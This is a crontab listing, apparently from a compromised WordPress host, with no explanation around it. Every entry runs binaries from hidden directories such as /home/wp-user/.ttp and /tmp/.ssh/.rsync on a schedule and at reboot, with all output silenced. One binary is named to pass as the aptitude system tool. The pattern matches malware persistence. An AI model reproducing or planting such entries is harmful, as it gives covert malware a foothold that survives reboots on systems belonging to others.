* */12 * * * /home/wp-user/.ttp/a/upd>/dev/null 2>&1
@reboot /home/wp-user/.ttp/a/upd>/dev/null 2>&1
5 8 * * 0 /home/wp-user/.ttp/b/sync>/dev/null 2>&1
@reboot /home/wp-user/.ttp/b/sync>/dev/null 2>&1  
#5 1 * * * /tmp/.ssh/.rsync/c/aptitude>/dev/null 2>&1
